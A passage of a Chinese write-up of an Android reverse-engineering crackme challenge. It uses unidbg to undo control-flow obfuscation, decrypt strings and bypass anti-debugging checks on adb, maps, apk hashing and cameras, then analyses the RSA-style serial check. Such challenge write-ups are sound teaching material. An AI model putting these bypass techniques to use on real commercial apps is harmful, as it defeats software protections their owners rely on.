253);">73</span>,<span style="color: rgb(255, 115, 253);">6</span> +<span style="color: rgb(255, 115, 253);">73</span>,<span style="color: rgb(255, 115, 253);">20</span> @@ <span style="color: rgb(150, 203, 254);">public</span> <span style="color: rgb(150, 203, 254);">class</span> <span style="color: rgb(255, 255, 182);">LinuxModule</span> <span style="color: rgb(150, 203, 254);">extends</span> <span style="color: rgb(255, 255, 182);">Module</span> {<br />                 }<br />             }<br />             <span style="color: rgb(124, 124, 124);">@Override</span><br />+            <span style="color: rgb(150, 203, 254);">public</span> Symbol <span style="color: rgb(255, 255, 182);">findClosestSymbolByAddress</span>(<span style="color: rgb(255, 255, 182);">long</span> address, <span style="color: rgb(255, 255, 182);">boolean</span> fast) {<br />+                <span style="color: rgb(150, 203, 254);">class</span> <span style="color: rgb(255, 255, 182);">Mutable</span> {<br />+                    <span style="color: rgb(255, 255, 182);">Symbol</span> <span style="color: rgb(198, 197, 254);">bestSymbol</span> = <span style="color: rgb(198, 197, 254);">null</span>;<br />+                };<br />+                <span style="color: rgb(255, 255, 182);">Mutable</span> <span style="color: rgb(198, 197, 254);">mutable</span> = <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">Mutable</span>();<br />+                symbols.forEach((name, value) -&gt; {<br />+                    <span style="color: rgb(150, 203, 254);">if</span> (value.peer &gt; address) <span style="color: rgb(150, 203, 254);">return</span>;<br />+                    <span style="color: rgb(150, 203, 254);">if</span> (mutable.bestSymbol == <span style="color: rgb(198, 197, 254);">null</span> || mutable.bestSymbol.getAddress() &lt; value.peer) {<br />+                        mutable.bestSymbol = <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">VirtualSymbol</span>(name, this, value.peer);<br />+                    }<br />+                });<br />+                <span style="color: rgb(150, 203, 254);">return</span> mutable.bestSymbol;<br />+            }<br />+            <span style="color: rgb(124, 124, 124);">@Override</span><br />             <span style="color: rgb(150, 203, 254);">public</span> ElfSymbol <span style="color: rgb(255, 255, 182);">getELFSymbolByName</span>(String name) {<br />                 <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(198, 197, 254);">null</span>;<br />             }</code></pre><p>然后我们就可以用类似下面的代码来得到每个调用目标的符号名（如果调用目标不是当前so的函数的话）：</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(255, 255, 182);">Module</span> <span style="color: rgb(198, 197, 254);">module2</span> = emulator.getMemory().findModuleByAddress(v.BLRTarget);<br /><span style="color: rgb(255, 255, 182);">Symbol</span> <span style="color: rgb(198, 197, 254);">symbol</span> = module2 == <span style="color: rgb(198, 197, 254);">null</span> ? <span style="color: rgb(198, 197, 254);">null</span> : module2.findClosestSymbolByAddress(v.BLRTarget, <span style="color: rgb(198, 197, 254);">true</span>);<br /><span style="color: rgb(255, 255, 182);">String</span> <span style="color: rgb(198, 197, 254);">moduleName</span> = module2 == <span style="color: rgb(198, 197, 254);">null</span> ? <span style="color: rgb(168, 255, 96);">"(null)"</span> : module2.name;<br /><span style="color: rgb(255, 255, 182);">String</span> <span style="color: rgb(198, 197, 254);">symbolName</span> = symbol == <span style="color: rgb(198, 197, 254);">null</span> ? <span style="color: rgb(168, 255, 96);">"(null)"</span> : symbol.getName();<br /><span style="color: rgb(255, 255, 182);">long</span> <span style="color: rgb(198, 197, 254);">symbolAddr</span> = symbol == <span style="color: rgb(198, 197, 254);">null</span> ? <span style="color: rgb(255, 115, 253);">0</span> : symbol.getAddress();<br /><span style="color: rgb(255, 255, 182);">HookedSymbol</span> <span style="color: rgb(198, 197, 254);">hookedSymbol</span> = memory.findHookedSymbol(v.BLRTarget);<br /><span style="color: rgb(150, 203, 254);">if</span> (hookedSymbol != <span style="color: rgb(198, 197, 254);">null</span>) {<br />    moduleName = hookedSymbol.getLibrary();<br />    symbolName = hookedSymbol.getSymbol();<br />    symbolAddr = hookedSymbol.getAddress();<br />}<br /><span style="color: rgb(124, 124, 124);">// JNI func not covered here(since it is not required here)</span><br />System.out.printf(<span style="color: rgb(168, 255, 96);">"[0x%s, \"%s\", \"%s\", 0x%x]"</span>, Long.toHexString(v.ins.getAddress() - <span style="color: rgb(150, 203, 254);">module</span>.base), moduleName, symbolName, v.BLRTarget - symbolAddr);</code></pre><p>这样下来仍然没有解析出的符号经验证全是 JNI calls。（完整 unidbg 记录代码见附件 Chunjie24Day7.java，完整 patch 代码见附件 patcher.py）</p><h4>间接条件跳转处理</h4><p>间接跳转不像间接调用那样反汇编出来是 BLR 就一定是混淆生成的，因此需要一定的手动模式匹配。</p><p>大部分条件间接跳转的核心语句是 CSEL X*, X*, X*, LT/EQ，然后是若干条不影响内存的 mov/add/orr/ldr 指令（但也有 stur），最后是一条 BR。</p><p>一开始我的做法是：一旦识别到符合条件的 CSEL 后我就会跟踪到 BR 的后一条指令，直到得知本次跳转的目标地址。</p><p>这样做还需要读取nzcv寄存器，来弄清楚此次跳转是在满足还是未满足条件的情况下进行的跳转（nzcv状态寄存器的值与条件码的对应关系见 NZCV寄存器简介 条件码简介）。</p><p>但这样直接错失了得到另一种状态下跳转目标的值的机会，因此最终我选择了这样做：</p><ol><li style="margin-left: 2px;"><p>模式匹配上 csel 指令后，保存当前寄存器上下文</p></li><li style="margin-left: 2px;"><p>将nzcv寄存器置为条件不满足</p></li><li style="margin-left: 2px;"><p>标记testCase变量后继续执行直到BR的下一条指令（过程中遇到stur指令（会导致无法通过上下文恢复的内存修改）直接修改PC跳过，经测试，跳过是不影响结果的）</p></li><li style="margin-left: 2px;"><p>记录跳转目标，恢复上下文</p></li><li style="margin-left: 2px;"><p>将nzcv寄存器置为条件满足，再来一遍3和4</p></li><li style="margin-left: 2px;"><p>正常执行csel</p></li></ol><p>因为上述流程是写在每条指令都会触发的 code hook 的回调里的，因此该流程要像状态机那样写。</p><p>对于 patch 而言值得注意的是：由于条件满足或不满足会跳转到不同位置，因此需要 patch 出两条不同的B.cond imm指令，而可供覆盖的 BR 指令只有一条。我的做法是 patch BR指令及其前一条指令（而 BR 指令前的指令除了一处外全是 add Xx, Xx, X*，是用来修改存储 BR Xx 的跳转目标寄存器 Xx 的；对于唯一的另外，手动交换那条指令与前面的 add 指令后 patch）。</p><p>完整 unidbg 记录代码见附件 Chunjie24Day7.java，完整 patch 代码见附件 patcher.py。</p><p>值得注意的是，unicorn 在调用 context_restore 恢复上下文的时候有个 bug：对PC的恢复并不会生效。</p><p>这是因为 unicorn 对 code hook 期间修改 PC 的支持是写在 reg_write 的 PC 分支的代码里的（见实现这一功能的 commit），因此我们需要在恢复上下文后显式设置 PC 一次：</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">backend.reg_write(Arm64Const.UC_ARM64_REG_PC, backend.reg_read(Arm64Const.UC_ARM64_REG_PC));</code></pre><h4>拼接 function chunks</h4><p>由于间接跳转阻断了正常的控制流分析，导致 IDA 分析出来的函数由断断续续的 chunks 组成，而实际的函数是连续的一大段的代码，因此需要手工标识。</p><p>附件 patcher.py 的 link_chunks 函数是一个辅助函数，传入已经被识别成函数体的任意 chunks 的任意 ea，和该函数的实际末尾的 ea（不含该 ea；通常是 ret 后或 BL .__stack_chk_fail 后），即可自动把这一整段识别为一个函数。</p><h4>性能优化</h4><p>整个 so 库执行的过程中，MD5 .text 节和两次 modPow 都相当耗时且会执行大量代码，为此需要优化 unidbg 的执行速度。</p><p>我的做法是：对于指令反汇编等操作，每个 PC 只会执行一次并存在 Map 中；对于很久没有出现新指令的情况，不再继续跟踪跳转/调用（标记 usingBasicHook = true；因为显然是处在某些循环里跑了很多轮了，再跟踪意义不大），只做最简单的判断，直到出现新的指令。</p><p>同时，还会记下是执行到收集了多少条不同 PC 的指令后开始停止详细跟踪的，后面出现的新的指令的 PC 是什么并打印（见 breakable Map，此外还会记录到出现新指令为止共跑了多少条指令到 skipTo Map，使得记录当前一共执行了多少条指令的参考日志（用于判断函数/循环的“大小”）正常输出）。这些输出作为常量保存；在下一次运行的时候一旦达到符合条件的情况，就解除原有 code hook，在新的指令的 PC 处创建一个新的 code hook，该 hook 的内容是恢复原有 hook，这样虽然 qemu 仍然没法不被打断地执行指令（unicorn 的后端，qemu，可在这种情况下用 JIT 执行指令），但这中间不会出现 Java 代码，相关的检查是纯 C 的 unicorn 做的。（见附件 Chunjie24Day7.java 的 Hooks 类的成员变量的使用。）</p><h4>字符串加密</h4><p>这个比较简单，看到字符串加密函数就在 unidbg 里打断点看看返回什么：</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(255, 255, 182);">long</span>[] decodedFunc = <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">long</span>[]{<span style="color: rgb(255, 115, 253);">0x19398</span>, <span style="color: rgb(255, 115, 253);">0x19C88</span>, <span style="color: rgb(255, 115, 253);">0x18A1C</span>, <span style="color: rgb(255, 115, 253);">0x1A314</span>, <span style="color: rgb(255, 115, 253);">0x23BF4</span>};<br /><span style="color: rgb(124, 124, 124);">/*<br />18a1c(decoded string): /proc/self/maps<br />19398(decoded string): %*x-%*lx %*4s %*lx %*s %*s %s<br />19c88(decoded string): com.wuaipojie.crackme2024<br />1a314(decoded string): /base.apk<br />23bf4(decoded string): ([BLjava/lang/String;)Z<br /> */</span><br /><span style="color: rgb(150, 203, 254);">for</span> (<span style="color: rgb(255, 255, 182);">long</span> addr : decodedFunc) {<br />    debugger.addBreakPoint(<span style="color: rgb(150, 203, 254);">module</span>.base + addr, (emulator2, address) -&gt; {<br />        debugger.addBreakPoint(emulator2.getContext().getLRPointer().peer, (emulator1, address1) -&gt; {<br />            System.out.println(Long.toHexString(addr) + <span style="color: rgb(168, 255, 96);">"(decoded string): "</span> + emulator1.getContext().getPointerArg(<span style="color: rgb(255, 115, 253);">0</span>).getString(<span style="color: rgb(255, 115, 253);">0</span>));<br />            <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(198, 197, 254);">true</span>;<br />        });<br />        <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(198, 197, 254);">true</span>;<br />    });<br />}</code></pre><p>而实际的字符串字面量解密过程就是 .rodata 里读两段连续的字节流，前面的长度与内容的字节流作为key，异或解密后面一段字节流作为字符串内容。</p><p>除此之外一些字符串字面量解密后会立即被随机生成的加密函数加密，然后等字符串要用的使用再解密出来，这个没什么意义。</p><h3>反反调试</h3><p>有一说一，第一个反调试极大的增强了我开始做时的信心，因为我发现验证逻辑跑了几万条指令就结束了，似乎非常简单（doge）</p><h4>USB 调试检查</h4><p>通过调用 <code style="font-family: SFMono-Regular, Consolas, ;">__system_property_get</code> 来取得 <code style="font-family: SFMono-Regular, Consolas, ;">init.svc.adbd</code> 这一属性，并判断是否是 running。</p><p>启用 adb 是很常见的操作，较少用于反调试（更坏心眼的是有提示用adb来输入长字符串），所以甚至 unidbg 的默认的 <code style="font-family: SFMono-Regular, Consolas, ;">/dev/__properties__</code> 文件中这一属性的值也是 running。</p><p>为此，需要hook这个函数，把内容改成 stopped 或者别的什么。</p><h4>内存读取</h4><p>第一个十分耗时的函数容易通过一些 magic number 识别为 MD5 算法，而 hook 得知十分耗时的被 MD5 的内容就是 start 函数开始（或 plt 表结束后）到 .text 结束的内容。</p><p>这些内容只读且没有经过任何重定位修改，因此内容和直接从文件中读出来相同。</p><p>得益于 unicorn 的 code hook 不需要修改代码段内容来设置软断点，因此这一反调试可以无视。</p><h4>apk 读取</h4><p>随后的 MD5 会对一个32位整数进行，而在此之前还会读取 /proc/self/maps 来获得一些信息（根据 syscall 日志得知）。</p><p>通过 Java 调试容易发现 unidbg 模拟的 maps 信息里只有 so 库的地址；通过字符串解密可以得到 com.wuaipojie.crackme2024 base.apk 等内容，可以猜测是想找到对 apk 的内存映射段。</p><p>我们在 MapsFileIO.java 里添加追加自定义内存段信息的功能：</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">diff --git a/unidbg-android/src/main/java/com/github/unidbg/linux/file/MapsFileIO.java b/unidbg-android/src/main/java/com/github/unidbg/linux/file/MapsFileIO.java<br />index d3537724..18a8c74c <span style="color: rgb(255, 115, 253);">100644</span><br />--- a/unidbg-android/src/main/java/com/github/unidbg/linux/file/MapsFileIO.java<br />+++ b/unidbg-android/src/main/java/com/github/unidbg/linux/file/MapsFileIO.java<br />@@ -<span style="color: rgb(255, 115, 253);">17</span>,<span style="color: rgb(255, 115, 253);">6</span> +<span style="color: rgb(255, 115, 253);">17</span>,<span style="color: rgb(255, 115, 253);">12</span> @@ <span style="color: rgb(150, 203, 254);">public</span> <span style="color: rgb(150, 203, 254);">class</span> <span style="color: rgb(255, 255, 182);">MapsFileIO</span> <span style="color: rgb(150, 203, 254);">extends</span> <span style="color: rgb(255, 255, 182);">ByteArrayFileIO</span> <span style="color: rgb(150, 203, 254);">implements</span> <span style="color: rgb(255, 255, 182);">FileIO</span> {<br /><br />     <span style="color: rgb(150, 203, 254);">private</span> <span style="color: rgb(150, 203, 254);">static</span> <span style="color: rgb(150, 203, 254);">final</span> <span style="color: rgb(255, 255, 182);">Log</span> <span style="color: rgb(198, 197, 254);">log</span> = LogFactory.getLog(MapsFileIO.class);<br /><br />+    <span style="color: rgb(150, 203, 254);">private</span> <span style="color: rgb(150, 203, 254);">static</span> <span style="color: rgb(150, 203, 254);">final</span> <span style="color: rgb(255, 255, 182);">StringBuilder</span> <span style="color: rgb(198, 197, 254);">appendLines</span> = <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">StringBuilder</span>();<br />+<br />+    <span style="color: rgb(150, 203, 254);">public</span> <span style="color: rgb(150, 203, 254);">static</span> <span style="color: rgb(150, 203, 254);">void</span> <span style="color: rgb(255, 255, 182);">addLine</span>(String line) {<br />+        appendLines.append(line).append(<span style="color: rgb(168, 255, 96);">'\n'</span>);<br />+    }<br />+<br />     <span style="color: rgb(150, 203, 254);">public</span> <span style="color: rgb(255, 255, 182);">MapsFileIO</span>(<span style="color: rgb(255, 255, 182);">int</span> oflags, String path, Collection&lt;Module&gt; modules) {<br />         super(oflags, path, getMapsData(modules, <span style="color: rgb(198, 197, 254);">null</span>));<br />     }<br />@@ -<span style="color: rgb(255, 115, 253);">69</span>,<span style="color: rgb(255, 115, 253);">6</span> +<span style="color: rgb(255, 115, 253);">75</span>,<span style="color: rgb(255, 115, 253);">7</span> @@ <span style="color: rgb(150, 203, 254);">public</span> <span style="color: rgb(150, 203, 254);">class</span> <span style="color: rgb(255, 255, 182);">MapsFileIO</span> <span style="color: rgb(150, 203, 254);">extends</span> <span style="color: rgb(255, 255, 182);">ByteArrayFileIO</span> <span style="color: rgb(150, 203, 254);">implements</span> <span style="color: rgb(255, 255, 182);">FileIO</span> {<br />         <span style="color: rgb(150, 203, 254);">if</span> (log.isDebugEnabled()) {<br />             log.debug(<span style="color: rgb(168, 255, 96);">"\n"</span> + builder);<br />         }<br />+        builder.append(appendLines);<br /><br />         <span style="color: rgb(150, 203, 254);">return</span> builder.toString().getBytes();<br />     }</code></pre><p>并使用它：</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">MapsFileIO.addLine(<span style="color: rgb(168, 255, 96);">"12345660-12345670 aaaa 123 aa aa /data/app/~~HnABphG7Pe6-7EcBE4_uzg==/com.wuaipojie.crackme2024-KLWRM_cmdomPT0Z97Sa0ZQ==/base.apk"</span>);</code></pre><p>然后根据 syscall 日志得知接下来会 open 这个 base.apk。因此需要把题目文件放到模拟文件系统的对应位置。</p><p>但似乎还是无法打开这个文件，调试 Java 发现是 new RandomAccessFile 时失败。</p><p>原因不详，但修改相应逻辑后可正常打开：</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">diff --git a/unidbg-android/src/main/java/com/github/unidbg/linux/file/SimpleFileIO.java b/unidbg-android/src/main/java/com/github/unidbg/linux/file/SimpleFileIO.java<br />index e4e1b4b9..8f3c8a8a <span style="color: rgb(255, 115, 253);">100644</span><br />--- a/unidbg-android/src/main/java/com/github/unidbg/linux/file/SimpleFileIO.java<br />+++ b/unidbg-android/src/main/java/com/github/unidbg/linux/file/SimpleFileIO.java<br />@@ -<span style="color: rgb(255, 115, 253);">41</span>,<span style="color: rgb(255, 115, 253);">7</span> +<span style="color: rgb(255, 115, 253);">41</span>,<span style="color: rgb(255, 115, 253);">7</span> @@ <span style="color: rgb(150, 203, 254);">public</span> <span style="color: rgb(150, 203, 254);">class</span> <span style="color: rgb(255, 255, 182);">SimpleFileIO</span> <span style="color: rgb(150, 203, 254);">extends</span> <span style="color: rgb(255, 255, 182);">BaseAndroidFileIO</span> <span style="color: rgb(150, 203, 254);">implements</span> <span style="color: rgb(255, 255, 182);">NewFileIO</span> {<br />                 <span style="color: rgb(150, 203, 254);">if</span> (!file.exists() &amp;&amp; !file.createNewFile()) {<br />                     <span style="color: rgb(150, 203, 254);">throw</span> <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">IOException</span>(<span style="color: rgb(168, 255, 96);">"createNewFile failed: "</span> + file);<br />                 }<br />-                _randomAccessFile = <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">RandomAccessFile</span>(file, <span style="color: rgb(168, 255, 96);">"rws"</span>);<br />+                _randomAccessFile = <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">RandomAccessFile</span>(file, !file.canWrite() ? <span style="color: rgb(168, 255, 96);">"r"</span> :<span style="color: rgb(168, 255, 96);">"rws"</span>);<br />                 onFileOpened(_randomAccessFile);<br />             }<br />             <span style="color: rgb(150, 203, 254);">return</span> _randomAccessFile;</code></pre><p>然后返回的32位数字就不是0或-1了。</p><p>这个逻辑和 genuine 读取 apk 的签名中的证书并计算 hash 来校验的逻辑类似。经过对比可知 unidbg 得到的32位值与 genuine 的那段逻辑得出的值相同，因此应该是正确的。（注意，bkdr hash 与手动 parser 用作安全校验用途是会有问题的，只能用于反调试用途。）</p><h4>摄像头检查</h4><p>通过调用 ACameraManager_getCameraIdList，检查返回的 numCameras 是否为 2，来判断是否是一台正常的手机设备。</p><p>为此，实现一个 VirtualModule 放到 unidbg-android/src/main/java/com/github/unidbg/virtualmodule/android/Camera2NdkModule.java 来实现此目的（内容见附件的 Camera2NdkModule.java）。</p><p>然后在主程序中启用：</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">Camera2NdkModule</span>(emulator, vm).register(memory);</code></pre><h3>解题</h3><h4>还原逻辑</h4><p>通过使用的常量进行猜测并 hook 函数并打印入参与返回值验证可知：对 checkSn 传入的字符串的作第一个操作函数是 base64Decode(24290)。</p><p>随后是 USB 调试检查和一个很大的函数 decryptInternal(1E924)。</p><p>在里面进行内存读取和 apk 读取得到的值进行多次 md5 后的值被传入 initBigNum(2A5C8)，除此之外还有两个常量也被传入了这个函数的另两次调用；随后是非常耗时的函数 modPow(37654) 的两次调用；后面又调用了 bigMul(30F4C),bigMod(36F00),bigNumOut(2AFE8)。</p><p>之所以确认这些函数和大整数有关并如此命名是因为题目提示解不唯一、验证字符串非常长等情况很明显是存在公钥验证算法才会发生的事情（而根据文本长度可以排除椭圆曲线，而 RSA 以外的算法又显得太过偏离“Android 高级题”的主题了），而验证算法里最耗时的显然会是 modPow 操作，根据 hook 函数打印的入参容易猜测谁是模数 n；而 bigMod 的传入参数里又有 n，因而猜测是 mod；剩下一个函数是乘法的可能非常高（除法需要 n，加法减法导致结果没有太好的性质）；然后根据 initBigNum 的输入（猜测为大端序）和 bigNumOut 的输出验证发现确实如此。</p><p>bigNumOut 后会按 PKCSv1.5 规定的公钥操作(BT=2)进行校验并取出解密结果作为 decryptInternal 的返回值。</p><p>最后是回到 checkSn 对 decryptInternal 返回值进行一次按字节加密后与传入的另一参数（uid 的 md5 结果）进行比较。</p><p>完整逻辑的 python 版本见附件 final.py 的 verify_logic。</p><h4>crypto</h4><p>按字节加密容易进行逆向，因此最终问题是求以下方程的 c。</p><p>c^{d1}c^{d2}\equiv m\pmod n</p><p>其中 d1 d2 n 已知，m的部分字节内容可随意，其余部分内容已知。</p><p>令 <span tabindex="0"><span style="display: inline-block; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal; width: 6.099em;"><span style="display: inline-block; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal; width: 5.237em; height: 0px; font-size: 16.24px;"><span><span style="display: inline; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal;"><span>d<span style="display: inline-block; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal; overflow: hidden; height: 1px; width: 0.003em;"></span></span><span>=</span><span>d<span style="display: inline-block; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal; overflow: hidden; height: 1px; width: 0.003em;"></span></span><span>1</span><span>+</span><span>d<span style="display: inline-block; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal; overflow: hidden; height: 1px; width: 0.003em;"></span></span><span>2</span></span><span style="display: inline-block; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal; width: 0px; height: 2.158em;"></span></span></span><span></span></span><span>�=�1+�2</span></span>，有 <span tabindex="0"><span style="display: inline-block; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal; width: 8.501em;"><span style="display: inline-block; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal; width: 7.331em; height: 0px; font-size: 16.24px;"><span><span style="display: inline; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal;"><span style="display: inline; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal;"><span style="display: inline-block; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal; width: 0.865em; height: 0px;"><span><span>c</span><span style="display: inline-block; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal; width: 0px; height: 4.006em;"></span></span><span><span>d<span style="display: inline-block; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal; overflow: hidden; height: 1px; width: 0.003em;"></span></span><span style="display: inline-block; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal; width: 0px; height: 4.006em;"></span></span></span></span><span>≡</span><span>m</span><span style="display: inline; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal;"><span style="display: inline-block; border-width: 0px; border-color: initial; vertical-align: 0em; line-height: normal; height: 0em; width: 0.434em; overflow: hidden;"></span></span><span>(</span><span>mod</span><span style="display: inline-block; border-width: 0px; border-color: initial; vertical-align: 0em; line-height: normal; height: 0em; width: 0.311em; overflow: hidden;"></span><span>n</span><span>)</span></span><span style="display: inline-block; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal; width: 0px; height: 2.158em;"></span></span></span><span></span></span><span>��≡�(mod�)</span></span>，是典型的私钥解密操作。</p><p>但实际上，能让攻击者知道的是公钥与公钥验签操作，把这里的 d 看作 e，容易发现这时BT应当为00或01。如果 d(被看作 e 的数字)很小，那么可以进行 Bleichenbacher's attack，但这里 d 很大。</p><p>实际上，这个验证逻辑除了允许填充非 FF 的非 0 值外，还允许解密后消息是以 uid 的 MD5 为前缀的任意消息。虽然这减少的攻击工作量在密码学上有意义，但实际上没用。</p><p>随后我又猜测 e(被看作 d)毕竟是 e，应该很小，但从1爆破到0x10001没有结果。</p><p>然后就只能猜测像 Android 中级题那样，某个奇怪的地方藏着公钥。但整个so、apk都给我翻了个底朝天后我仍然一无所获 QAQ（这就是为什么有人会分析字符串解密的过程）。</p><p>而最后提示直接提供了 e=0x200001，那么整个题目就被很容易地做完了（代码见 final.py 末尾）。</p><p>回过头来看如何得到 e：</p><p>对于已知 d（可看作 e）求小 e（可看作 d）可采用 Boneh-Durfee Attack 这样的小私钥指数攻击，这远比爆破来得快。但出题人的 phi 实际上并不是 <span tabindex="0"><span style="display: inline-block; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal; width: 10.964em;"><span style="display: inline-block; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal; width: 9.424em; height: 0px; font-size: 16.24px;"><span><span style="display: inline; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal;"><span>ϕ</span><span>(</span><span>n</span><span>)</span><span>=</span><span>(</span><span>p</span><span>−</span><span>1</span><span>)</span><span>(</span><span>q<span style="display: inline-block; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal; overflow: hidden; height: 1px; width: 0.003em;"></span></span><span>−</span><span>1</span><span>)</span></span><span style="display: inline-block; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal; width: 0px; height: 2.158em;"></span></span></span><span></span></span><span>�(�)=(�−1)(�−1)</span></span> 而是 <span tabindex="0"><span style="display: inline-block; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal; width: 12.442em;"><span style="display: inline-block; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal; width: 10.717em; height: 0px; font-size: 16.24px;"><span><span style="display: inline; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal;"><span>λ</span><span>(</span><span>n</span><span>)</span><span>=</span><span>l</span><span>c</span><span>m</span><span>(</span><span>p</span><span>−</span><span>1</span><span>,</span><span>q<span style="display: inline-block; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal; overflow: hidden; height: 1px; width: 0.003em;"></span></span><span>−</span><span>1</span><span>)</span></span><span style="display: inline-block; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal; width: 0px; height: 2.158em;"></span></span></span><span></span></span><span>�(�)=���(�−1,�−1)</span></span> 因此直接用 Boneh-Durfee Attack 是没法得出结果的（这个攻击是基于 <span tabindex="0"><span style="display: inline-block; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal; width: 7.762em;"><span style="display: inline-block; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal; width: 6.653em; height: 0px; font-size: 16.24px;"><span><span style="display: inline; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal;"><span>e</span><span>d<span style="display: inline-block; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal; overflow: hidden; height: 1px; width: 0.003em;"></span></span><span>=</span><span>k</span><span>ϕ</span><span>(</span><span>n</span><span>)</span><span>+</span><span>1</span></span><span style="display: inline-block; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal; width: 0px; height: 2.158em;"></span></span></span><span></span></span><span>��=��(�)+1</span></span> 来进行的），需要先猜一下 <span tabindex="0"><span style="display: inline-block; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal; width: 8.377em;"><span style="display: inline-block; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal; width: 7.208em; height: 0px; font-size: 16.24px;"><span><span style="display: inline; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal;"><span>g<span style="display: inline-block; border-width: 0px; border-color: initial; vertical-align: 0px; line-height: normal; overflow: hidden; height: 